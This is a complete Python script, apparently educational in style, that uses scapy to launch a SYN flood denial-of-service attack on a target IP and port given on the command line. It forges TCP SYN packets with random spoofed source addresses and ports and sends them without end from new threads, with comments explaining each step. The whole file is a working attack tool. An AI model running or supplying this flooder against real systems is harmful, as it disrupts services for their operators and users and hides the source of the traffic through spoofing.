import socket, random, sys, threading 
from scapy.all import *

#control arguments
if len(sys.argv) != 3: # required ip address and port
	print("Few arguments")
	sys.exit( 1 )

target = sys.argv[1] 
port = int(sys.argv[2])

total = 0
conf.iface='en1';#network card XD  ?????

class sendSYN(threading.Thread):
	global target, port # attack to a specific target and from specific source ip
	def __init__(self):
		threading.Thread.__init__(self)
	def run(self):
		#creating packet
		# insert IP header fields
		#Forge the SYN packet -> IP layer
		i = IP()
		#set source IP as random valid IP
		#source ip address is randomly generated using the function -> random.randint
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		# forge IP packet with target ip as the destination IP address
		i.dst = target

		# insert TCP header fields
		#destination ip address, is the server’s ip address
		t = TCP()
		#set source port as random valid port
		# the s port is in a range between 1 and 65535
		t.sport = random.randint(1,65535) #source port is randomly generated with this function
		#destination port, is the server’s listening port 
		t.dport = port
		#set SYN flag that means is a SYN segment
		# flag s = SYN packet
		t.flags = 'S'

		# stack up the layers
		# send the constructed packet in a loop until CTRL+C is detected 
		# the function send sends packets at layer 3 -> network layer
		# Viene assegnato un indirizzo IP univoco
		# setting verbose to 0 will not print anything during the process
		p = i/t
		send(p, verbose=0)

print ("Flooding %s:%i with SYN packets." % (target, port))
while 1:
	#call SYNFlood attack
	#Packets are sent by calling the function sendSYN into while 1 loop
	sendSYN().start()
	total += 1
	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)